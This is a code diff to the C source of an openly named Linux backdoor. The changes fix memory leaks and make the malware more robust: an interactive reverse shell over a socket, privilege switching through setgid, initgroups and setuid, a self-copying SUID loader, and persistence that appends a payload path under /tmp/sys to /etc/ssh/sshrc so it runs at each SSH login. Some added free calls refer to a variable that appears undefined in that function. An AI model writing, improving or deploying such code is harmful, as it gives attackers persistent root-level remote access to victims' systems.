@@ -14,6 +14,8 @@
 */
 #include "core.h"
 #include <libgen.h>
+#include <pwd.h>
+#include <grp.h>
 
 /* LOGO */
 const char * ascii_art[] = {
@@ -87,6 +89,7 @@ static void fill_fallback_machine_id(char * machine_id, size_t n) {
     exit(EXIT_FAILURE);
   }
   snprintf(machine_id, n, "%s", random_md5);
+  free(random_md5);
 }
 
 char * get_machine_id() {
@@ -125,6 +128,7 @@ void backdoor_loader(void) {
   ssize_t len = readlink("/proc/self/exe", src_path, sizeof(src_path) - 1);
   if (len == -1) {
     perror("readlink");
+    free(random_md5);
     exit(EXIT_FAILURE);
   }
   src_path[len] = '\0';
@@ -132,6 +136,7 @@ void backdoor_loader(void) {
   int src_fd = open(src_path, O_RDONLY);
   if (src_fd == -1) {
     perror("open");
+    free(random_md5);
     exit(EXIT_FAILURE);
   }
 
@@ -139,16 +144,18 @@ void backdoor_loader(void) {
   if (dst_fd == -1) {
     perror("open");
     close(src_fd);
+    free(random_md5);
     exit(EXIT_FAILURE);
   }
 
   ssize_t bytes_read;
   char buffer[4096];
   while ((bytes_read = read(src_fd, buffer, sizeof(buffer))) > 0) {
-    if (write(dst_fd, buffer, bytes_read) != bytes_read) {
+      if (write(dst_fd, buffer, bytes_read) != bytes_read) {
       perror("write");
       close(src_fd);
       close(dst_fd);
+      free(random_md5);
       exit(EXIT_FAILURE);
     }
   }
@@ -157,6 +164,7 @@ void backdoor_loader(void) {
     perror("read");
     close(src_fd);
     close(dst_fd);
+    free(random_md5);
     exit(EXIT_FAILURE);
   }
   close(src_fd);
@@ -166,6 +174,7 @@ void backdoor_loader(void) {
   // Set execute permissions and SUID
   if (chmod(destination, S_IRWXU | S_IXGRP | S_IXOTH | S_ISUID) == -1) {
     perror("chmod failed");
+    free(random_md5);
     exit(EXIT_FAILURE);
   }
 
@@ -179,6 +188,7 @@ void backdoor_loader(void) {
   execv(destination, argv);
 
   perror("execv failed");
+  free(random_md5);
   exit(EXIT_FAILURE);
 }
 /* Normal method when payload in other directory [return:null] */
@@ -239,12 +249,12 @@ void reverse_shell(int uid,
   dup2(sockfd, 1);
   dup2(sockfd, 2);
 
-  for (int i = 0; i < sizeof(ascii_art_rev) / sizeof(ascii_art[0]); i++) {
-    write(0, ascii_art_rev[i], strlen(ascii_art_rev[i]));
-    write(0, "\n", 1);
+  for (int i = 0; i < (int)(sizeof(ascii_art_rev) / sizeof(ascii_art_rev[0])); i++) {
+    write(1, ascii_art_rev[i], strlen(ascii_art_rev[i]));
+    write(1, "\n", 1);
   }
 
-  execl("/bin/bash", "bash", NULL);
+  execl("/bin/bash", "bash", "-i", NULL);
   close(sockfd);
   exit(EXIT_FAILURE);
 }
@@ -252,12 +262,20 @@ void reverse_shell(int uid,
 void set_uid(int target_uid) {
   if (has_suid_privileges() || is_root()) {
     printf("[*] Current user is root, setting UID to %d...\n", target_uid);
+    struct passwd * pw = getpwuid((uid_t) target_uid);
+    gid_t gid = pw ? pw -> pw_gid : (gid_t) target_uid;
+    if (pw && initgroups(pw -> pw_name, gid) < 0) {
+      perror("[!] Failed to set supplementary groups");
+    }
+    if (setgid(gid) < 0) {
+      perror("[!] Failed to set GID");
+      exit(EXIT_FAILURE);
+    }
     if (setuid(target_uid) < 0) {
       perror("[!] Failed to set UID");
       exit(EXIT_FAILURE);
-    } else {
-      printf("[*] UID set to %d successfully.\n", target_uid);
     }
+    printf("[*] UID set to %d successfully.\n", target_uid);
   } else {
     printf("[!] Current user is not root, UID: %d.\n", getuid());
     printf("[!] Root privileges are required to perform this operation.\n");
@@ -283,6 +301,9 @@ void create_directory_if_not_exists(const char * dir_path) {
 }
 /* Update the configuration file [/etc/ty.conf] [return:null] */
 void write_ty_conf(char * md5_name) {
+  if (md5_name == NULL || !is_valid_md5(md5_name)) {
+    return;
+  }
   FILE * file = fopen("/etc/ty.conf", "w");
   if (file == NULL) {
     perror("Failed to open /etc/ty.conf for writing");
@@ -297,16 +318,33 @@ void write_ty_conf(char * md5_name) {
 }
 /* Update the configuration file [/etc/ssh/sshrc] [return:null] */
 void write_sshrc(char * md5_name) {
+  if (md5_name == NULL || !is_valid_md5(md5_name)) {
+    return;
+  }
   create_directory_if_needed("/etc/ssh");
-  FILE * file = fopen("/etc/ssh/sshrc", "w");
+
+  char line[PATH_MAX];
+  snprintf(line, sizeof(line), "/tmp/sys/%s", md5_name);
+
+  FILE * existing = fopen("/etc/ssh/sshrc", "r");
+  if (existing != NULL) {
+    char buf[PATH_MAX];
+    while (fgets(buf, sizeof(buf), existing)) {
+      buf[strcspn(buf, "\n")] = '\0';
+      if (strcmp(buf, line) == 0) {
+        fclose(existing);
+        return;
+      }
+    }
+    fclose(existing);
+  }
+
+  FILE * file = fopen("/etc/ssh/sshrc", "a");
   if (file == NULL) {
     perror("Failed to open /etc/ssh/sshrc for writing");
     return;
   }
-
-  if (md5_name != NULL && strlen(md5_name) > 0) {
-    fprintf(file, "/tmp/sys/%s\n", md5_name);
-  }
+  fprintf(file, "%s\n", line);
   fclose(file);
 }
 /* Update the configuration file [/etc/ssh/sshrc] [return:null] */
@@ -474,6 +512,10 @@ void local_exp(const char * path) {
 
     if (!is_duplicate) {
       char * random_cli_hash = generate_random_md5();
+      if (random_cli_hash == NULL) {
+        sleep(5);
+        continue;
+      }
 
       char new_file_path[PATH_MAX];
       snprintf(new_file_path, sizeof(new_file_path), "/tmp/sys/%s", random_cli_hash);
@@ -481,6 +523,8 @@ void local_exp(const char * path) {
       int src_fd = open(path, O_RDONLY);
       if (src_fd == -1) {
         perror("open source file");
+        free(random_cli_hash);
+        free(self_hash);
         return;
       }
 
@@ -488,6 +532,8 @@ void local_exp(const char * path) {
       if (dst_fd == -1) {
         perror("open destination file");
         close(src_fd);
+        free(random_cli_hash);
+        free(self_hash);
         return;
       }
 
@@ -498,6 +544,8 @@ void local_exp(const char * path) {
           perror("write");
           close(src_fd);
           close(dst_fd);
+          free(random_cli_hash);
+          free(self_hash);
           return;
         }
       }
@@ -517,7 +565,9 @@ void local_exp(const char * path) {
 
       write_sshrc(random_cli_hash);
       write_ty_conf(random_cli_hash);
-      strncpy(last_cli_md5_hash, random_cli_hash, PATH_MAX);
+      strncpy(last_cli_md5_hash, random_cli_hash, sizeof(last_cli_md5_hash) - 1);
+      last_cli_md5_hash[sizeof(last_cli_md5_hash) - 1] = '\0';
+      free(random_cli_hash);
 
     } else {
 
@@ -529,7 +579,8 @@ void local_exp(const char * path) {
       }
 
       if (strcmp(cli_md5_hash, last_cli_md5_hash) != 0 && (is_valid_md5(cli_md5_hash))) {
-        strncpy(last_cli_md5_hash, cli_md5_hash, PATH_MAX);
+        strncpy(last_cli_md5_hash, cli_md5_hash, sizeof(last_cli_md5_hash) - 1);
+        last_cli_md5_hash[sizeof(last_cli_md5_hash) - 1] = '\0';
       }
 
     }
@@ -548,6 +599,10 @@ void tmp_proc(const char * path, int id,
   }
   
   char * random_cli_hash = generate_random_md5();
+  if (random_cli_hash == NULL) {
+    free(self_hash);
+    return;
+  }
 
   char existing_file_path[PATH_MAX];
   if (!check_local_for_same_hash(self_hash, existing_file_path)) {
@@ -557,6 +612,7 @@ void tmp_proc(const char * path, int id,
     int src_fd = open(path, O_RDONLY);
     if (src_fd == -1) {
       perror("open source file");
+      free(random_cli_hash);
       free(self_hash);
       return;
     }
@@ -565,6 +621,7 @@ void tmp_proc(const char * path, int id,
     if (dst_fd == -1) {
       perror("open destination file");
       close(src_fd);
+      free(random_cli_hash);
       free(self_hash);
       return;
     }
@@ -576,6 +633,7 @@ void tmp_proc(const char * path, int id,
         perror("write");
         close(src_fd);
         close(dst_fd);
+        free(random_cli_hash);
         free(self_hash);
         return;
       }
@@ -596,10 +654,12 @@ void tmp_proc(const char * path, int id,
     printf("[+] Repaired the backdoor successfully\n");
     printf("[+] Use the command to start the backdoor => %s\n", extract_filename(new_file_path));
   } else {
+    free(random_cli_hash);
     free(self_hash);
     reverse_shell(id, rhost, rport);
     return;
   }
+  free(random_cli_hash);
   free(self_hash);
 }
 /* Checks if a file with the given hash exists in the /usr/local/bin directory.
